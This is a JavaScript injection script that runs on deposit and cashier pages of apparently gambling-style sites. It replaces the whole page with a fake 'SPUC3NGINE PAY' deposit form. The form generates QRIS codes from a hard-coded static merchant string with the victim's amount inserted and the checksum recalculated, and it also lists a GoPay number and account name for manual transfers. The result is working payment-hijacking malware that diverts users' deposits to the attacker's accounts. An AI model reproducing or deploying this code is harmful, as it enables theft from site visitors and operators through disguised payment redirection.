(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php',
    '/index.php?page=deposit',
  ];

  if (!match.some(path => url.includes(path))) return;

  // ==========================================
  // EMVCo TLV PARSER & CRC16 CALCULATOR
  // ==========================================

  const RAW_STATIC_QRIS = "00020101021126610014COM.GO-JEK.WWW01189360091438288678500210G8288678500303UKE51440014ID.CO.QRIS.WWW0215ID10254600521900303UKE5204753853033605802ID5920SPUC3NGINE, Otomotif6006BANTUL61055518862070703A0163047E23";

  function calculateCRC16(str) {
    let crc = 0xFFFF;
    for (let i = 0; i < str.length; i++) {
      let c = str.charCodeAt(i);
      crc ^= (c << 8);
      for (let j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, '0');
  }

  function parseTLV(qrisStr) {
    const tags = [];
    let pos = 0;
    while (pos < qrisStr.length) {
      if (pos + 4 > qrisStr.length) break;
      const tag = qrisStr.substr(pos, 2);
      const len = parseInt(qrisStr.substr(pos + 2, 2), 10);
      if (isNaN(len) || pos + 4 + len > qrisStr.length) break;
      const value = qrisStr.substr(pos + 4, len);
      tags.push({ tag, len, value });
      pos += 4 + len;
    }
    return tags;
  }

  function generateDynamicQRIS(baseQr, amount) {
    let tags = parseTLV(baseQr.trim());
    tags = tags.filter(item => item.tag !== '63' && item.tag !== '54');

    const amtStr = amount.toString();
    const tag54 = {
      tag: '54',
      len: amtStr.length,
      value: amtStr
    };

    const index53 = tags.findIndex(item => item.tag === '53');
    if (index53 !== -1) {
      tags.splice(index53 + 1, 0, tag54);
    } else {
      const index58 = tags.findIndex(item => item.tag === '58');
      if (index58 !== -1) {
        tags.splice(index58, 0, tag54);
      } else {
        tags.push(tag54);
      }
    }

    let payload = "";
    tags.forEach(item => {
      const lenStr = item.len.toString().padStart(2, '0');
      payload += `${item.tag}${lenStr}${item.value}`;
    });

    payload += "6304";
    const checksum = calculateCRC16(payload);
    return payload + checksum;
  }

  // ==========================================
  // DOM INJECTION & STYLES (CYBER UI + TOKOPAY IMAGE)
  // ==========================================

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SPUC3NGINE PAY - SYSTEM PEMBAYARAN OTOMATIS TERBAIK</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --bg-core: #04070a;
        --card-bg: rgba(10, 15, 22, 0.95);
        --panel-inner: rgba(15, 23, 34, 0.85);
        --neon-green: #00ff66;
        --neon-yellow: #ffe600;
        --neon-green-glow: rgba(0, 255, 102, 0.4);
        --neon-yellow-glow: rgba(255, 230, 0, 0.4);
        --text-white: #ffffff;
        --text-gray: #94a3b8;
      }

      body {
        margin: 0;
        font-family: 'Rajdhani', sans-serif;
        background-color: var(--bg-core);
        background-image: 
          radial-gradient(circle at 50% 0%, rgba(0, 255, 102, 0.12), transparent 70%),
          linear-gradient(rgba(0, 255, 102, 0.03) 1px, transparent 1px),
          linear-gradient(90deg, rgba(0, 255, 102, 0.03) 1px, transparent 1px);
        background-size: 100% 100%, 25px 25px, 25px 25px;
        color: var(--text-white);
        display: flex;
        justify-content: center;
        align-items: flex-start;
        min-height: 100vh;
        padding: 30px 0;
        box-sizing: border-box;
      }

      .outer-card {
        position: relative;
        max-width: 440px;
        width: 92%;
        border-radius: 24px;
        padding: 2px;
        background: transparent;
        overflow: hidden;
        box-shadow: 0 0 40px rgba(0, 255, 102, 0.25), 0 20px 60px rgba(0, 0, 0, 0.95);
      }

      .outer-card::before {
        content: '';
        position: absolute;
        top: -50%; left: -50%;
        width: 200%; height: 200%;
        background: conic-gradient(
          from 0deg,
          transparent 0deg,
          var(--neon-green) 120deg,
          transparent 180deg,
          var(--neon-yellow) 300deg,
          transparent 360deg
        );
        animation: rotateCyberGlow 3s linear infinite;
        z-index: 0;
      }

      @keyframes rotateCyberGlow {
        100% { transform: rotate(360deg); }
      }

      .container {
        width: 100%;
        background: var(--card-bg);
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        padding: 30px 22px;
        border-radius: 22px;
        display: flex;
        flex-direction: column;
        box-sizing: border-box;
        position: relative;
        z-index: 1;
      }

      .header-logo {
        text-align: center;
        margin-bottom: 20px;
      }

      .qris-header-logo {
        height: 38px;
        filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));
      }

      .brand-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 18px;
        font-weight: 900;
        text-align: center;
        margin-top: 6px;
        letter-spacing: 1.5px;
      }
      .brand-title span {
        color: var(--neon-green);
        text-shadow: 0 0 10px var(--neon-green-glow);
        animation: blinkGreen 1.2s infinite alternate;
      }
      .brand-title .yellow-txt {
        color: var(--neon-yellow);
        text-shadow: 0 0 10px var(--neon-yellow-glow);
      }

      @keyframes blinkGreen {
        0% { opacity: 0.6; }
        100% { opacity: 1; filter: drop-shadow(0 0 8px var(--neon-green)); }
      }

      .tab-switcher {
        display: flex;
        background: rgba(0, 0, 0, 0.6);
        padding: 4px;
        border-radius: 12px;
        border: 1px solid rgba(0, 255, 102, 0.2);
        margin-bottom: 20px;
        gap: 6px;
      }

      .tab-btn {
        flex: 1;
        padding: 11px;
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 800;
        letter-spacing: 1px;
        color: var(--text-gray);
        background: transparent;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s ease;
        text-transform: uppercase;
      }

      .tab-btn.active {
        background: var(--neon-green);
        color: #000;
        box-shadow: 0 0 15px var(--neon-green-glow);
      }

      .deposit-panel {
        display: none;
      }

      .deposit-panel.active {
        display: block;
        animation: panelFade 0.3s ease both;
      }

      @keyframes panelFade {
        from { opacity: 0; transform: translateY(8px); }
        to { opacity: 1; transform: translateY(0); }
      }

      .form-group {
        display: flex;
        flex-direction: column;
        width: 100%;
        margin-bottom: 18px;
      }

      .form-group label {
        font-size: 14px;
        font-weight: 700;
        color: var(--text-white);
        margin-bottom: 8px;
      }

      select, input {
        width: 100%;
        padding: 14px 16px;
        border: 1px solid rgba(255, 255, 255, 0.12);
        border-radius: 12px;
        font-size: 15px;
        font-weight: 600;
        background: rgba(15, 23, 34, 0.9);
        color: #fff;
        font-family: 'Rajdhani', sans-serif;
        box-sizing: border-box;
        transition: all 0.25s ease;
      }

      select:focus, input:focus {
        outline: none;
        border-color: var(--neon-green);
        box-shadow: 0 0 12px var(--neon-green-glow);
      }

      .btn-submit {
        width: 100%;
        background: var(--neon-yellow);
        color: #000;
        border: none;
        padding: 16px;
        border-radius: 12px;
        font-family: 'Orbitron', sans-serif;
        font-size: 14px;
        font-weight: 900;
        letter-spacing: 1.5px;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 0 20px var(--neon-yellow-glow);
        margin-top: 5px;
        text-transform: uppercase;
      }

      .btn-submit:hover {
        background: #fff;
        box-shadow: 0 0 25px rgba(255, 255, 255, 0.5);
        transform: translateY(-1px);
      }

      .guide-box {
        background: var(--panel-inner);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 16px;
        padding: 20px;
        margin-top: 22px;
      }

      .guide-title {
        color: var(--neon-yellow);
        font-family: 'Orbitron', sans-serif;
        font-size: 14px;
        font-weight: 800;
        margin-bottom: 12px;
      }

      .guide-list {
        margin: 0;
        padding-left: 18px;
        color: #cbd5e1;
        font-size: 13.5px;
        line-height: 1.6;
        font-weight: 600;
      }

      .guide-list li {
        margin-bottom: 4px;
      }

      .gopay-card {
        background: linear-gradient(135deg, rgba(0, 255, 102, 0.1), rgba(0, 165, 207, 0.05));
        border: 1px solid var(--neon-green);
        border-radius: 14px;
        padding: 16px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 18px;
      }

      .pay-info {
        display: flex;
        flex-direction: column;
      }

      .pay-label {
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 800;
        color: var(--neon-green);
      }

      .pay-number {
        font-size: 20px;
        font-weight: 700;
        color: #fff;
        letter-spacing: 0.5px;
      }

      .pay-name {
        font-size: 13px;
        color: var(--neon-yellow);
        font-weight: 700;
      }

      .btn-copy {
        background: rgba(0, 255, 102, 0.15);
        border: 1px solid var(--neon-green);
        color: var(--neon-green);
        padding: 8px 14px;
        border-radius: 8px;
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 800;
        cursor: pointer;
        transition: all 0.2s ease;
      }

      .btn-copy:hover {
        background: var(--neon-green);
        color: #000;
        box-shadow: 0 0 12px var(--neon-green-glow);
      }

      /* GAMBAR LIST PAYMENT TOKOPAY REPLACEMENT */
      .payment-banner-container {
        margin-top: 25px;
        width: 100%;
        background: rgba(255, 255, 255, 0.95);
        border-radius: 12px;
        padding: 10px;
        box-sizing: border-box;
        box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .payment-banner-img {
        width: 100%;
        height: auto;
        display: block;
        object-fit: contain;
      }

      .qr-wrapper { text-align: center; margin-top: 20px; }
      
      .qr-holder {
        background: #fff;
        padding: 12px;
        border-radius: 14px;
        display: inline-block;
        box-shadow: 0 0 25px var(--neon-green-glow);
        border: 2px solid var(--neon-green);
        position: relative;
        overflow: hidden;
      }

      .qr-holder::after {
        content: '';
        position: absolute;
        top: 0; left: 0; right: 0;
        height: 3px;
        background: var(--neon-yellow);
        box-shadow: 0 0 10px var(--neon-yellow);
        animation: laser 2s ease-in-out infinite alternate;
      }

      @keyframes laser {
        0% { top: 0%; }
        100% { top: 96%; }
      }

      .qr-holder img { width: 210px; height: 210px; display: block; }

      .qr-amount-info {
        margin-top: 10px;
        font-family: 'Orbitron', sans-serif;
        font-size: 15px;
        color: var(--neon-yellow);
        font-weight: 800;
      }

      .qr-action-grid { display: flex; gap: 10px; margin-top: 18px; }
      .qr-action-grid button {
        flex: 1;
        padding: 14px;
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 800;
        border-radius: 8px;
        cursor: pointer;
        border: none;
      }

      .btn-download { background: #090c10; color: var(--neon-green); border: 1px solid var(--neon-green) !important; }
      .btn-done { background: var(--neon-yellow); color: #000; }

      .loader {
        width: 30px;
        height: 30px;
        border: 3px solid rgba(0,255,102,0.1);
        border-top: 3px solid var(--neon-green);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      .notification-toast {
        position: fixed;
        bottom: 25px;
        left: 50%;
        transform: translateX(-50%);
        background: var(--neon-green);
        color: #000;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 13px;
        font-weight: 800;
        font-family: 'Orbitron', sans-serif;
        opacity: 0;
        pointer-events: none;
        transition: all 0.3s ease;
        z-index: 10000;
        box-shadow: 0 0 20px var(--neon-green-glow);
      }
      .notification-toast.visible { opacity: 1; }
      .notification-toast.err-mode { background: #ff2a2a; color: #fff; }
    </style>
  `;

  document.body.innerHTML = `
    <div class="outer-card">
      <div class="container">
        
        <div class="header-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QRIS_logo.svg/960px-QRIS_logo.svg.png" class="qris-header-logo">
          <div class="brand-title"><span>SPUC3NGINE</span> <span class="yellow-txt">PAY</span></div>
        </div>

        <div class="tab-switcher">
          <button class="tab-btn active" onclick="switchDepositTab('qris-panel', this)">Otomatis QRIS</button>
          <button class="tab-btn" onclick="switchDepositTab('manual-panel', this)">Manual GoPay</button>
        </div>

        <div id="qris-panel" class="deposit-panel active">
          <div class="form-group">
            <label>Nominal Deposit (Rp)</label>
            <input id="deposit-val" type="text" placeholder="Contoh: 50000" oninput="formatCurrencyInput(this)">
          </div>

          <div class="form-group">
            <label>Pilih Bonus Promosi</label>
            <select id="deposit-bonus">
              <option value="NO_BONUS">Tanpa Bonus (Default)</option>
              <option value="NEW_MEMBER_100">BONUS NEW MEMBER 100%</option>
              <option value="DEPOSIT_HARIAN_10">BONUS HARIAN 10%</option>
            </select>
          </div>

          <button class="btn-submit" onclick="processDepositForm()">BUAT QRIS SEKARANG</button>
          <div id="form-feedback" class="qr-wrapper"></div>
        </div>

        <div id="manual-panel" class="deposit-panel">
          <div class="gopay-card">
            <div class="pay-info">
              <span class="pay-label">E-WALLET GOPAY</span>
              <span class="pay-number" id="target-gopay-num">088294217129</span>
              <span class="pay-name">A/N ICHWAN</span>
            </div>
            <button class="btn-copy" onclick="copyValueToClipboard('target-gopay-num', 'NOMOR GOPAY')">SALIN</button>
          </div>

          <div class="form-group">
            <label>Nominal Transfer (Rp)</label>
            <input id="manual-deposit-val" type="text" placeholder="Contoh: 50000" oninput="formatCurrencyInput(this)">
          </div>

          <button class="btn-submit" onclick="processManualDepositForm()">KONFIRMASI GOPAY</button>
          <div id="manual-form-feedback" class="qr-wrapper"></div>
        </div>

        <div class="guide-box">
          <div class="guide-title">Panduan Pembayaran:</div>
          <ol class="guide-list">
            <li>Buka aplikasi Bank atau E-Wallet (Dana, Ovo, GoPay, dll).</li>
            <li>Pilih fitur "Scan" atau "Bayar".</li>
            <li>Arahkan kamera ke kode QRIS di atas.</li>
            <li>Masukkan nominal sesuai tagihan dan selesaikan transaksi.</li>
          </ol>
        </div>

        <!-- GAMBAR LIST PAYMENT DARI TOKOPAY -->
        <div class="payment-banner-container">
          <img src="https://tokopay.id/assets/img/list-payment.png" alt="List Payment Channels Tokopay" class="payment-banner-img">
        </div>

      </div>
    </div>
    <div id="notification-toast" class="notification-toast"></div>
  `;

  // ==========================================
  // ACTION LOGICS
  // ==========================================

  window.switchDepositTab = function (panelId, buttonElement) {
    document.querySelectorAll('.deposit-panel').forEach(panel => panel.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.getElementById(panelId).classList.add('active');
    buttonElement.classList.add('active');
  };

  window.formatCurrencyInput = function (element) {
    let value = element.value.replace(/[^0-9]/g, "");
    if (value === "") {
      element.value = "";
      return;
    }
    element.value = Number(value).toLocaleString("id-ID");
  };

  function parseAmount(str) {
    return Number(str.replace(/\./g, "") || 0);
  }

  function renderNotification(msg, isError = false) {
    const toast = document.getElementById("notification-toast");
    toast.textContent = msg;
    toast.className = isError ? "notification-toast visible err-mode" : "notification-toast visible";
    setTimeout(() => toast.classList.remove("visible"), 2500);
  }

  window.copyValueToClipboard = function (elementId, labelName) {
    const textToCopy = document.getElementById(elementId).textContent;
    navigator.clipboard.writeText(textToCopy).then(() => {
      renderNotification(`✓ ${labelName} BERHASIL DISALIN`);
    }).catch(() => {
      renderNotification("GAGAL MENYALIN DATA", true);
    });
  };

  window.processDepositForm = function () {
    const amt = parseAmount(document.getElementById("deposit-val").value);
    if (amt < 10000) return renderNotification("MINIMAL DEPOSIT Rp 10.000", true);
    
    document.getElementById("form-feedback").innerHTML = '<div class="loader"></div>';

    const dynamicQrPayload = generateDynamicQRIS(RAW_STATIC_QRIS, amt);
    const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(dynamicQrPayload)}`;

    setTimeout(() => {
      document.getElementById("form-feedback").innerHTML = `
        <div class="qr-holder">
          <img id="generated-qris-img" src="${qrImageUrl}" alt="Dynamic QRIS Pay">
        </div>
        <div class="qr-amount-info">TOTAL: Rp ${amt.toLocaleString("id-ID")}</div>
        <div class="qr-action-grid">
          <button class="btn-download" onclick="downloadSecureQR('${qrImageUrl}')">SIMPAN QRIS</button>
          <button class="btn-done" onclick="history.back()">SUDAH BAYAR</button>
        </div>
      `;
    }, 1000);
  };

  window.processManualDepositForm = function () {
    const amt = parseAmount(document.getElementById("manual-deposit-val").value);
    if (amt < 10000) return renderNotification("MINIMAL TRANSFER Rp 10.000", true);

    document.getElementById("manual-form-feedback").innerHTML = '<div class="loader"></div>';

    setTimeout(() => {
      document.getElementById("manual-form-feedback").innerHTML = "";
      renderNotification("✓ DATA TERKIRIM! SILAHKAN TUNGGU");
      setTimeout(() => {
        window.open("https://direct.lc.chat/19851307/", "_blank");
      }, 1000);
    }, 1200);
  };

  window.downloadSecureQR = function (qrUrl) {
    const targetUrl = qrUrl || document.getElementById("generated-qris-img").src;
    
    fetch(targetUrl)
      .then(response => response.blob())
      .then(blob => {
        const blobUrl = URL.createObjectURL(blob);
        const anchor = document.createElement("a");
        anchor.href = blobUrl;
        anchor.download = "qris-spuc3ngine.png";
        document.body.appendChild(anchor);
        anchor.click();
        document.body.removeChild(anchor);
        URL.revokeObjectURL(blobUrl);
        renderNotification("✓ QRIS BERHASIL DISIMPAN");
      })
      .catch(() => {
        renderNotification("GAGAL MENGUNDUH GAMBAR", true);
      });
  };
})();
